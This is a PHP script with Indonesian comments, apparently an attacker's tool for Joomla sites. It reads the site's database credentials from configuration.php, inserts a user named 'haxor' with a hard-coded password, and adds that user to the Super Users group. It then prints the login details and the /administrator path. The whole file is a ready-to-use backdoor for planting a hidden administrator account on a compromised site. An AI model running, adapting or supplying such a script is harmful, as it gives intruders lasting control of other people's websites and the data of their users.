<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Ambil konfigurasi dari configuration.php Joomla
require_once __DIR__ . '/configuration.php';
$config = new JConfig();

// Ambil data koneksi dari config
$db_host = 'localhost';
$db_user = $config->user;
$db_pass = $config->password;
$db_name = $config->db;
$db_prefix = $config->dbprefix;

// Data akun admin baru
$username = 'haxor';
$password_plain = 'taktiktuk123';
$name = 'Super Admin';
$email = 'haxor@example.com';
$params = '{}'; // field wajib isi (default kosong)

// Hash password pakai bcrypt (Joomla 3/4/5)
$hashed_password = password_hash($password_plain, PASSWORD_BCRYPT);

// Koneksi ke MySQL
$mysqli = new mysqli($db_host, $db_user, $db_pass, $db_name);
if ($mysqli->connect_error) {
    die('❌ DB Connect Error: ' . $mysqli->connect_error);
}

// Insert user ke tabel users
$stmt1 = $mysqli->prepare("INSERT INTO `{$db_prefix}users` 
(name, username, email, password, block, sendEmail, registerDate, params) 
VALUES (?, ?, ?, ?, 0, 1, NOW(), ?)");
$stmt1->bind_param("sssss", $name, $username, $email, $hashed_password, $params);
$stmt1->execute();
$user_id = $stmt1->insert_id;

// Assign user ke grup Super Users (group_id 8)
$stmt2 = $mysqli->prepare("INSERT INTO `{$db_prefix}user_usergroup_map` (user_id, group_id) VALUES (?, 8)");
$stmt2->bind_param("i", $user_id);
$stmt2->execute();

// Output hasil
echo "✅ User Super Admin berhasil dibuat!<br>";
echo "👉 Username: <b>$username</b><br>";
echo "👉 Password: <b>$password_plain</b><br>";
echo "📥 Login: /administrator";
?>
